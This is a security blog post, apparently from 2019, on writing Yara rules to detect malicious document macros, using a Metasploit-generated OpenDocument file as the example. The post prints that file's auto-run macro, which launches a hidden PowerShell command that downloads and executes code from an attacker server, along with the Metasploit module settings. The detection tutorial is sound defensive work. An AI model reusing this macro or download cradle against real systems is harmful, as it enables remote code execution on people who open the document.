# Analyzing Document Macros with Yara

[phishing](/tags#phishing ) [vbscript](/tags#vbscript ) [yara](/tags#yara )
[documents](/tags#documents ) [metasploit](/tags#metasploit )
[powershell](/tags#powershell )  
  
Mar 27, 2019

Analyzing Document Macros with Yara

![](https://0xdfimages.gitlab.io/img/yara-cover.png) This post is actually
inspired by a box I’m building for HTB, so if it ever gets released, some of
you may see this post again. But Yara is also something I’ve used a ton
professionally, and it is super useful. I’ll introduce Yara, a pattern
matching tool which is super useful for malware analysis, and just a general
use tool that’s useful to know. I’ll also look at the file format for both
Microsoft Office and Libre Office documents, and how to decompress them to
identify their contents. I’ll show how for Libre Office files, Yara can be
applied to the unzipped document to identify macro contents.

## Yara

### Background

[Yara](https://yara.readthedocs.io/en/v3.5.0/index.html) is a tool that allows
you to write rules to identify, organize, and classify similar files. This is
particularly useful to malware analysts, who want to gather various samples
that share certain characteristics to analyze together. The tool will scan
through a file or directory of files with a provided rule and identify any
files that match the patterns in the rule.

### Installation

Most Linux distros will allow `apt install yara`. For Windows, you’ll need to
[download the
binaries](https://b161268c3bf5a87bc67309e7c870820f5f39f672.googledrive.com/host/0BznOMqZ9f3VUek8yN3VvSGdhRFU/)
(yes, the official docs point to a weird googledrive url).

### Example Rule

I’ll borrow an example rule from the [Yara
Documentation](https://yara.readthedocs.io/en/v3.5.0/index.html), thought with
some modification for my purposes:

    
    
    rule silent_banker
    {
        meta:
            description = "This is just an example"
            thread_level = 3
            in_the_wild = true
        strings:
            $a = {6A 40 68 00 30 00 00 6A 14 8D 91}
            $b = /([0-9]{1,3}\.){3}[0-9]{1,3}/
            $c = "UVODFRYSIHLNWPEJXQZAKCBGMT"
        condition:
            $a or $b or $c
    }
    

The rule starts with a name, and then has three sections:

  * `meta` \- metadata about the rule; helpful to keeping lots of rules organized, but not required
  * `strings` \- define patterns to match on
  * `condition` \- defines what combination of strings must be present to make a match 
    * you can do things like `$c at 0` to specify the location in the file that the string much match as well
    * if you define several strings that start with `$s` (such as `$s1`, `$s2`, etc), you can also do `all of $s*`.

I’ve got three example strings there:

  * `$a` is a set of hex bytes to look for
  * `$b` is a regex pattern, in this case matching on IPv4 address
  * `$c` is a string that will match on that ASCII string; strings can also take descriptors like `ascii`, `wide`, and `nocase`

## Document Formats

### Zip Archives

At the heart of it, both modern Office documents (`.docx`, `.docm`, `.xlsx`,
etc) using the [Office Open XML
format](https://en.wikipedia.org/wiki/Office_Open_XML) and Libre Office and
Open Office documents (`.odt`, `ods`, etc) using the [OpenDocument
format](https://en.wikipedia.org/wiki/OpenDocument) are zip-compressed
archives of XML documents.

This is not the case for legacy [Binary File
Format](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-
doc/ccd7b486-7881-484c-a137-51170af7cc22) used in (`.doc`, `.xls`, etc).

### Office Open XML Example

I took a Macro-enabled Excel document that I had around for other purposes,
renamed it to `test.xlsm.zip`, and extracted the contents. Here’s what I got
out (macros highlighted with `<--`):

    
    
    C:\Users\0xdf\Desktop\test.xlsm>tree /a /f
    Folder PATH listing for volume Windows
    Volume serial number is 14AC-CC80
    C:.
    |   [Content_Types].xml
    +---docProps
    |       app.xml
    |       core.xml
    +---xl
    |   |   calcChain.xml
    |   |   comments1.xml
    |   |   sharedStrings.xml
    |   |   styles.xml
    |   |   vbaProject.bin     <-- macros
    |   |   workbook.xml
    |   +---activeX
    |   |   |   activeX1.bin
    |   |   |   activeX1.xml
    |   |   |   activeX2.bin
    |   |   |   activeX2.xml
    |   |   |   activeX3.bin
    |   |   |   activeX3.xml
    |   |   |   activeX4.bin
    |   |   |   activeX4.xml
    |   |   |   activeX5.bin
    |   |   |   activeX5.xml
    |   |   \---_rels
    |   |           activeX1.xml.rels
    |   |           activeX2.xml.rels
    |   |           activeX3.xml.rels
    |   |           activeX4.xml.rels
    |   |           activeX5.xml.rels
    |   +---charts
    |   |       chart1.xml
    |   |       chart2.xml
    |   |       chart3.xml
    |   |       chart4.xml
    |   +---drawings
    |   |   |   drawing1.xml
    |   |   |   drawing2.xml
    |   |   |   vmlDrawing1.vml
    |   |   \---_rels
    |   |           drawing1.xml.rels
    |   |           drawing2.xml.rels
    |   |           vmlDrawing1.vml.rels
    |   +---media
    |   |       image1.gif
    |   |       image2.emf
    |   |       image3.emf
    |   |
    |   +---printerSettings
    |   |       printerSettings1.bin
    |   |       printerSettings2.bin
    |   |       printerSettings3.bin
    |   |       printerSettings4.bin
    |   |
    |   +---theme
    |   |       theme1.xml
    |   |
    |   +---worksheets
    |   |   |   sheet1.xml
    |   |   |   sheet2.xml
    |   |   |   sheet3.xml
    |   |   |   sheet4.xml
    |   |   \---_rels
    |   |           sheet1.xml.rels
    |   |           sheet2.xml.rels
    |   |           sheet3.xml.rels
    |   |           sheet4.xml.rels
    |   \---_rels
    |           workbook.xml.rels
    \---_rels
            .rels
    

Unfortunately, the macros are in `vbaProject.bin`, which is a binary format.
The format is [well
documented](https://www.codeproject.com/Articles/15216/Office-2007-bin-file-
format), and tools like
[oledump](https://blog.didierstevens.com/programs/oledump-py/) and
[olevba](https://github.com/decalage2/oletools/wiki/olevba) will display
macros without having to open or unzip the document in Office.

### OpenDocument Format

The OpenDocument Format can be unzipped the same way. If I rename a `.ods`
file to `.zip`, and unzip, I get:

    
    
    root@kali# tree .
    .
    ├── Basic
    │   ├── script-lc.xml
    │   └── Standard
    │       ├── script-lb.xml
    │       └── temp.xml
    ├── Configurations2
    │   ├── accelerator
    │   ├── floater
    │   ├── images
    │   │   └── Bitmaps
    │   ├── menubar
    │   ├── popupmenu
    │   ├── progressbar
    │   ├── statusbar
    │   ├── toolbar
    │   └── toolpanel
    ├── content.xml
    ├── manifest.rdf
    ├── META-INF
    │   └── manifest.xml
    ├── meta.xml
    ├── mimetype
    ├── settings.xml
    ├── styles.xml
    └── Thumbnails
        └── thumbnail.png
    

In this case, `temp.xml` has my full macros in it:

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
    <script:module xmlns:script="http://openoffice.org/2000/script" script:name="temp" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
    
    Sub Main
    
            Shell(&quot;ping -n 2 10.5.5.5&quot;)
    
    End Sub
    
    </script:module>
    

## Rule For MSF Libre Office

### Metasploit odt

Metasploit has a module for OpenDocument creation.

#### MSF Implementation

The module has the following options:

    
    
    msf5 > use exploit/multi/misc/openoffice_document_macro
    msf5 exploit(multi/misc/openoffice_document_macro) > options
    
    Module options (exploit/multi/misc/openoffice_document_macro):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       BODY                       no        The message for the document body
       FILENAME  msf.odt          yes       The OpoenOffice Text document name
       SRVHOST   0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
       SRVPORT   8080             yes       The local port to listen on.
       SSL       false            no        Negotiate SSL for incoming connections
       SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
       URIPATH                    no        The URI to use for this exploit (default is random)
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     10.5.5.5         yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Apache OpenOffice on Windows (PSH)
    
    

On running, it will generate a document with a macro. That macro contains code
that executes a PowerShell downloader, which reaches back to my Kali box and
downloads the rest of the payload, in this case, Meterpreter.

#### Generate Document

I’ll run this to generate the document and start the listener. I’ll have to
chance the `SRVPORT` as I already have burp listening on 8080, and it won’t
create the document if it can’t listen.

    
    
    msf5 exploit(multi/misc/openoffice_document_macro) > [*] Using URL: http://0.0.0.0:8088/Pc2F6ndgt1H5jGs
    [*] Local IP: http://10.1.1.41:8088/Pc2F6ndgt1H5jGs
    [*] Server started.
    [*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
    [*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2                                                                                                           
    [*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
    [*] Packaging file: Configurations2/accelerator/current.xml
    [*] Packaging file: manifest.rdf
    [*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
    [*] Packaging file: Basic/script-lc.xml
    [*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
    [*] Packaging file: Basic/Standard/Module1.xml
    [*] Packaging file: Basic/Standard/script-lb.xml
    [*] Packaging file: meta.xml
    [*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
    [*] Packaging file: META-INF/manifest.xml
    [*] Packaging file: content.xml
    [*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
    [*] Packaging file: Thumbnails/thumbnail.png
    [*] Packaging file: mimetype
    [*] Packaging file: styles.xml
    [*] Packaging file: settings.xml
    [+] msf.odt stored at /root/.msf4/local/msf.odt
    

I can take my document and run it somewhere to try to get a connection, but
for the purposes of this post, I can exit MSF now.

#### Document

Now I can open up the document and take a look.

    
    
    root@kali# unzip msf.zip 
    Archive:  msf.zip
     extracting: Configurations2/accelerator/current.xml  
      inflating: manifest.rdf            
      inflating: Basic/script-lc.xml     
      inflating: Basic/Standard/Module1.xml  
      inflating: Basic/Standard/script-lb.xml  
      inflating: meta.xml                
      inflating: META-INF/manifest.xml   
      inflating: content.xml             
      inflating: Thumbnails/thumbnail.png  
     extracting: mimetype                
      inflating: styles.xml              
      inflating: settings.xml            
    root@kali# ls
    Basic  Configurations2  content.xml  manifest.rdf  META-INF  meta.xml  mimetype  settings.xml  styles.xml  Thumbnails
    

I’ll find the macros in the Basic folder, under `Module1.xml`:

    
    
    root@kali# tree Basic/
    Basic/
    ├── script-lc.xml
    └── Standard
        ├── Module1.xml
        └── script-lb.xml
    
    1 directory, 3 files
    

Here’s the code (I’ve pulled it out of the XML and removed some of the simple
encoding like replacing `&quot;` with `"`):

    
    
        Sub OnLoad
          Dim os as string
          os = GetOS
          If os = "windows" OR os = "osx" OR os = "linux" Then
            Exploit
          end If
        End Sub
    
        Sub Exploit
          Shell("cmd.exe /C ""powershell.exe -nop -w hidden -c $i=new-object net.webclient;$i.proxy=[Net.WebRequest]::GetSystemWebProxy();$i.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $i.downloadstring('http://10.1.1.41:8088/Pc2F6ndgt1H5jGs');""";)
        End Sub
    
        Function GetOS() as string
          select case getGUIType
            case 1:
              GetOS = "windows"
            case 3:
              GetOS = "osx"
            case 4:
              GetOS = "linux"
          end select
        End Function
    
        Function GetExtName() as string
          select case GetOS
            case "windows"
              GetFileName = "exe"
            case else
              GetFileName = "bin"
          end select
        End Function
    

There’s four functions. I’m going to guess (correctly) that `OnLoad` is called
on document open. It calls `GetOs`, and if the result is `windows`, `osx`, or
`linux`, it calls `Exploit`. `Exploit` issues a common PowerShell command to
download and execute further PowerShell from the Metasploit server.

### odt Yara Rule

Now that I see how the Metasploit code looks, I can write a yara rule to look
for it. A first attempt might be something like this:

    
    
    rule metasploit 
    {
        strings:
            $getos = "select case getGUIType" nocase
            $getext = "select case GetOS" nocase
            $func1 = "Sub OnLoad" nocase
            $func2 = "Sub Exploit" nocase
            $func3 = "Function GetOS() as string" nocase
            $func4 = "Function GetExtName() as string" nocase
    
        condition:
            (all of ($get*) or 3 of ($func*))
    }
    

I’ll look for strings that seem like they might be specific to the Metasploit
generated document, like the function names.

This is obviously an art, not a science, and there are many ways to with this.
I may want to look for better signatures because the function names are
arbitrary, and could be modified by the attacker. On the other hand, I could
find that other documents have similar function names and return false
positives. Perhaps I should look for the PowerShell code instead. Obviously
test this for your environment and use-case to both ensure you’re getting as
much of the bad stuff as possible while not being flooded with false
positives.

### Run It

I can now run this against the directory containing my unzipped document. I’ll
use `-r` to search into subdirectories, give it my rule, and the directory to
check. It returns the name of the rule that matched, and the file that
matched:

    
    
    root@kali# yara -r metasploit_ods.yara odt
    metasploit odt/Basic/Standard/Module1.xml
    

## What About MS Office?

I’ll focus the rest of this post on simple rules to look for malicious
PowerShell in OpenDocument format, since the macros are easily available once
unzipped.

There are still plenty of things you can do with an unzipped word doc. Some
examples:

  * Identify [hover links](https://qz.com/1003250/this-malware-activates-when-you-hover-over-a-link-in-microsoft-powerpoint/).
  * Identify [presence of macros](https://github.com/Yara-Rules/rules/blob/master/Malicious_Documents/Maldoc_VBA_macro_code.yar) in a document.
  * [DDE](https://www.trendmicro.com/vinfo/us/security/news/threat-landscape/dde-what-it-is-what-it-does-and-how-to-defend-against-attackers-who-may-exploit-it) can be used to get RCE, and [yara can detect it](https://github.com/Yara-Rules/rules/blob/master/Malicious_Documents/Maldoc_DDE.yar) in Binary Office Documents.
  * Find RTF exploits like [CVE-2017-0199](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html), which is often found in [Word docs](https://github.com/Yara-Rules/rules/blob/master/Malicious_Documents/Maldoc_CVE-2017-0199.yar).

That said, if you’re in a position to unzip a word doc and run yara against
it, you’re likely in a position to run `olevba` against it as well to dump the
code, and then run yara against that as well.

## Conclusion

This post only scratches the surface of what can be done with Yara, and how I
might look at documents. Yara can be such a powerful tool to matching and
identifying malicious files. There is certainly an art of making rules that
catch the stuff you want and don’t return false positives, and any rule is
likely going to have to be tuned to the environment and use case. Hopefully
this sparks some ideas for how you might use Yara to solve a problem you face.

[](/2019/03/27/analyzing-document-macros-with-yara.html)

